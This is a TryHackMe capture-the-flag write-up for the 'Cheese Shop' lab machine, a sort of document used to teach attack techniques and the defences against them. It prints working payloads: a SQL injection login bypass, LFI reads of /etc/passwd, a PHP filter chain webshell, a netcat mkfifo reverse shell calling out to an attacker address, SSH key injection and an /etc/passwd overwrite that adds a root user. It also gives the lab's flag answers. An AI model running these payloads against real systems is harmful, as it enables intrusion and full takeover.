# 🧀 The Cheese Shop: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `cheese` / `10.49.168.178` |
| **OS** | Ubuntu 20.04 |
| **Attack Surface** | SQLi login bypass, LFI via `php://filter`, PHP filter chain RCE |
| **Privesc** | Writable `authorized_keys` → writable systemd timer → SUID `xxd` → `/etc/passwd` overwrite |

The Cheese Shop presents a PHP login form that weakly filters SQL injection — stripping `OR` variants but leaving `||` untouched — granting access to an admin panel. That panel exposes a trivial LFI through an unguarded `include()` which leaks application source including hardcoded database credentials. SQLmap extracts a user hash via time-based blind injection, and a PHP filter chain converts the LFI into file-less RCE. Initial foothold lands as `www-data`, with `comte`'s `authorized_keys` world-writable — pivoting via an injected SSH key. Privilege escalation abuses a writable `exploit.timer` unit that triggers a SUID `xxd` binary, which rewrites `/etc/passwd` to inject a crafted root-level user.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 cheese -oA tcpscan-cheese
sudo nmap -sU -p- -vv -T4 cheese -oA udpscan-cheese
```

The TCP scan produced garbled output — the `.nmap` file came out at 120 bytes, essentially just header/footer with no port data. The target appeared to be rate-limiting or dropping probes during the full `-p-` sweep. Ports 22 and 80 were confirmed through direct service interaction rather than scan output.

```
22/tcp  open  ssh     OpenSSH (Ubuntu)
80/tcp  open  http    Apache 2.4.41 (Ubuntu)
```

### File Bruteforce

```bash
ffuf -u http://cheese/FUZZ -w ./Web-Content/raft-medium-files.txt -ic -fc 403,401
```

```
login.php               [Status: 200, Size: 834]
index.html              [Status: 200, Size: 1759]
users.html              [Status: 200, Size: 377]
orders.html             [Status: 200, Size: 380]
messages.html           [Status: 200, Size: 448]
```

`users.html`, `orders.html`, and `messages.html` look like admin panel stubs — there's a privileged interface somewhere that serves them.

### Directory Bruteforce

```bash
ffuf -u http://cheese/FUZZ -w ./Web-Content/raft-medium-directories.txt -ic -fc 403,401
```

```
images   [Status: 301]
```

---

## 💀 Initial Access

### SQL Injection — Login Bypass

The `login.php` form sanitises input with a regex that strips `OR` in all case variants (`/\b[oO][rR]\b/`) before passing it to a MySQL query. However `||` — the SQL logical OR operator — is never filtered.

Payload:

```
POST /login.php
username=admin'+||+1%3d1+--+-&password=admin
```

```
HTTP/1.1 302 Found
Location: secret-script.php?file=supersecretadminpanel.html
```

`||` short-circuits the `WHERE` clause regardless of the password field. Login bypassed.

### LFI Discovery — Admin Panel

The admin panel's navigation links pass `php://filter` wrappers directly into the URL parameter:

```html
<a href="secret-script.php?file=php://filter/resource=orders.html">Orders</a>
<a href="secret-script.php?file=php://filter/resource=messages.html">Messages</a>
<a href="secret-script.php?file=php://filter/resource=users.html">Users</a>
```

Reading `secret-script.php` source via base64 filter confirms an unguarded include:

```bash
curl -sk 'http://10.49.168.178/secret-script.php?file=php://filter/convert.base64-encode/resource=secret-script.php' | base64 -d
```

```php
<?php
  if(isset($_GET['file'])) {
    $file = $_GET['file'];
    include($file);
  }
?>
```

No path restrictions, no wrapper allowlist — anything `include()` can resolve is readable.

### LFI — /etc/passwd

```bash
curl 'http://10.49.168.178/secret-script.php?file=php://filter/resource=../../../../../../../../../etc/passwd'
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
comte:x:1000:1000:comte:/home/comte:/bin/bash
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
ubuntu:x:1001:1002:Ubuntu:/home/ubuntu:/bin/bash
```

Users of interest: `comte` and `ubuntu`.

### LFI — Source Disclosure and Credential Leak

```bash
curl -sk 'http://10.49.168.178/secret-script.php?file=php://filter/convert.base64-encode/resource=login.php' | base64 -d
```

```php
// Replace these with your database credentials
$servername = "localhost";
$user = "comte";                    // <-- DB username
$password = "VeryCheesyPassword";   // <-- DB password
$dbname = "users";

$conn = new mysqli($servername, $user, $password, $dbname);

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $pass = $_POST["password"];

    function filterOrVariations($input) {
        // filters OR/or/Or/oR -- but NOT ||
        $filtered = preg_replace('/\b[oO][rR]\b/', '', $input);
        return $filtered;
    }

    $filteredInput = filterOrVariations($username);
    $hashed_password = md5($pass);

    // INJECTION POINT: $filteredInput is user-controlled, || is not stripped
    $sql = "SELECT * FROM users WHERE username='$filteredInput' AND password='$hashed_password'";
    $result = $conn->query($sql);

    if ($result->num_rows == 1) {
        header("Location: secret-script.php?file=supersecretadminpanel.html");
        exit;
    }
}
```

Two findings: hardcoded DB credentials (`comte` / `VeryCheesyPassword`, database `users`), and the injectable query is plainly visible. The `$filteredInput` is passed unsanitised into a single-quoted string context — closing the quote and appending `|| 1=1 -- -` authenticates as any user.

Direct SSH with the DB credentials failed for both `comte` and `ubuntu` — password authentication disabled.

### Database Enumeration — SQLmap Time-Based Blind

The OR filter and MD5 pre-hashing of the password field blocked sqlmap's standard detection. With `--level=5 --risk=3 --code=302` and the `between` tamper, sqlmap found a time-based blind injection point on `username`:

```bash
sqlmap -r req.txt --dbms=mysql --level=5 --risk=3 --code=302 --batch --tamper=between --dbs
```

```
back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)

available databases [2]:
[*] information_schema
[*] users
```

```bash
sqlmap -r req.txt --dbms=mysql --technique=T --level=5 --risk=3 --batch -D users --dump
```

```
Database: users
Table: users
[1 entry]
+----+----------------------------------+----------+
| id | password                         | username |
+----+----------------------------------+----------+
| 1  | 5b0c2e1b4fe1410e47f26feff7f4fc4c | comte    |
+----+----------------------------------+----------+
```

Attempted to crack the MD5 hash with hashcat against `weakpass_4.txt`:

```bash
hashcat -m 0 hash.txt ./weakpass_4.txt
```

```
Session..........: hashcat
Status...........: Quit
Hash.Mode........: 0 (MD5)
Hash.Target......: 5b0c2e1b4fe1410e47f26feff7f4fc4c
Time.Started.....: Mon Apr 20 01:03:53 2026 (8 secs)
Time.Estimated...: Mon Apr 20 01:05:04 2026 (1 min, 3 secs)
Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
Progress.........: 229113856/2191700885 (10.45%)
Started: Mon Apr 20 01:03:52 2026
Stopped: Mon Apr 20 01:04:02 2026
```

No plaintext recovered. Dead end.

### PHP Filter Chain — File-less RCE

**Tool:** [php_filter_chain_generator](https://github.com/synacktiv/php_filter_chain_generator)

**Mechanism:** PHP's `include()` processes the `file` parameter through the filter wrapper stack before execution. By chaining large numbers of `convert.iconv` and `convert.base64-decode` filters with carefully chosen encodings, the tool manufactures arbitrary bytes purely through the side-effects of the conversion pipeline — no file is ever written to disk. The output of the chain is a string that, when PHP includes it, decodes to valid PHP source containing the injected payload. Every character of the target string is synthesised by finding an encoding chain that produces that exact byte via the iconv/base64 manipulation.

```bash
CHAIN=$(python3 php_filter_chain_generator.py --chain '<?php system($_GET["cmd"]); ?>' | tail -1)
curl "http://10.49.168.178/secret-script.php?file=${CHAIN}&cmd=id" --output -
```

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Note: curl requires `--output -` here — the filter chain output contains binary garbage after the command result and curl refuses to print binary to the terminal without it.

### Reverse Shell

```bash
# listener
nc -nlvp 4444

# trigger — URL-encoded mkfifo netcat reverse shell
curl "http://10.49.168.178/secret-script.php?file=${CHAIN}&cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.240.231%204444%20%3E%2Ftmp%2Ff" --output -
```

### Shell Stabilisation

```bash
/usr/bin/python3 -c 'import pty; pty.spawn("/bin/bash")'
# ctrl+z
stty raw -echo; fg
export TERM='xterm'
stty rows 53 cols 148
```

---

## 🔁 Privilege Escalation

### www-data → comte — Writable authorized_keys

```bash
find / -type f -writable 2>/dev/null | grep -i comte
```

```
/home/comte/.ssh/authorized_keys
```

`authorized_keys` is world-writable (`-rw-rw-rw-`). Generated a keypair on the attack box and injected the public key:

```bash
# attack box
ssh-keygen -t ed25519 -f ~/thm/cheese/id_ed25519

# on target as www-data
echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMDw6VQ0gqScvEgNJKLPfi/b4h15lY7ceQYzWaHhyCbP evdaez@attack' >> /home/comte/.ssh/authorized_keys
```

```bash
ssh -i id_ed25519 comte@cheese
```

**User flag:** `THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}`

### comte → root — Writable systemd Timer + SUID xxd

```bash
sudo -l
```

```
(ALL) NOPASSWD: /bin/systemctl daemon-reload
(ALL) NOPASSWD: /bin/systemctl restart exploit.timer
(ALL) NOPASSWD: /bin/systemctl start exploit.timer
(ALL) NOPASSWD: /bin/systemctl enable exploit.timer
```

```bash
find /etc/systemd/system/ -writable 2>/dev/null
# /etc/systemd/system/exploit.timer
```

`exploit.timer` is writable by `comte`. The accompanying `exploit.service` (triggered by the timer) drops `/opt/xxd` with SUID root. Modified the timer to fire immediately on daemon-reload:

```bash
vi /etc/systemd/system/exploit.timer
```

```ini
[Unit]
Description=Exploit Timer

[Timer]
OnBootSec=1

[Install]
WantedBy=timers.target
```

```bash
sudo /bin/systemctl daemon-reload
sudo /bin/systemctl restart exploit.timer
```

```
/opt/xxd   -rwsr-sr-x   root root
```

SUID `xxd` allows arbitrary file read/write as root. Copied the current `/etc/passwd` to `/tmp`, appended a crafted root-level user, then wrote it back:

```bash
cp /etc/passwd /tmp/newpasswd
echo 'hacker:$1$xyz$bSwwbqiW5NnVzFI9QMXZE0:0:0:root:/root:/bin/bash' >> /tmp/newpasswd
cat /tmp/newpasswd | xxd | /opt/xxd -r - /etc/passwd
```

```bash
su - hacker
```

```
root@ip-10-49-168-178:~#
```

**Root flag:** `THM{dca75486094810807faf4b7b0a929b11e5e0167c}`

---

## 🗺️ Attack Chain

```
[ffuf — file/dir bruteforce]
    login.php, users.html, orders.html, messages.html
          │
          ▼
[SQL Injection — login bypass]
    OR filter evaded via || operator → 302 → secret-script.php admin panel
          │
          ▼
[LFI — secret-script.php?file=]
    php://filter base64 → login.php source
    DB creds: comte / VeryCheesyPassword
    /etc/passwd → users: comte, ubuntu
          │
          ▼
[SQLmap — time-based blind]
    users DB dump → MD5 hash for comte (uncrackable)
          │
          ▼
[PHP Filter Chain — file-less RCE]
    php_filter_chain_generator → injected webshell → www-data
    mkfifo reverse shell → foothold
          │
          ▼
[Writable authorized_keys]
    /home/comte/.ssh/authorized_keys (0666)
    inject SSH pubkey → SSH as comte
          │
          ▼
[Writable exploit.timer + sudo systemctl]
    OnBootSec=1 → daemon-reload → /opt/xxd spawned SUID root
          │
          ▼
[SUID xxd — /etc/passwd overwrite]
    cp /etc/passwd /tmp/newpasswd → append hacker:UID=0
    xxd reverse write → su - hacker → root
```

---

## 📌 Key Takeaways

- OR-based SQLi filters are bypassed by `||` — blacklists that don't account for SQL syntax equivalents are ineffective
- An unguarded `include($_GET['file'])` with no wrapper restrictions is sufficient for full RCE via PHP filter chains — no file write required
- Hardcoded database credentials in application source are a direct lateral movement path; LFI + source disclosure is a compound vulnerability, not just an info leak
- World-writable `authorized_keys` grants persistent SSH access to any user without needing their password
- Writable systemd unit files combined with sudo `systemctl` permissions are a reliable and frequently overlooked privilege escalation path
- SUID `xxd` enables arbitrary file read/write as root — always check GTFOBins for any unexpected SUID binary

---

## 🛠️ Tools Used

| Tool | Purpose |
| --- | --- |
| `nmap` | Port and service enumeration |
| `ffuf` | Web file and directory bruteforce |
| `curl` | Manual LFI testing and source disclosure |
| `sqlmap` | Time-based blind SQL injection, database dump |
| `php_filter_chain_generator.py` | Generate PHP filter chain for file-less RCE |
| `nc` | Reverse shell listener |
| `python3` | Shell stabilisation via `pty.spawn` |
| `ssh-keygen` | Generate SSH keypair for `authorized_keys` injection |
| `ssh` | Persistent access as `comte` |
| `hashcat` | Attempted MD5 hash cracking |
| `xxd` | SUID binary exploitation — `/etc/passwd` overwrite |

## 🚩 Flags

| Flag | Value |
| --- | --- |
| `user.txt` | `THM{9f2ce3df1beeecaf695b3a8560c682704c31b17a}` |
| `root.txt` | `THM{dca75486094810807faf4b7b0a929b11e5e0167c}` |
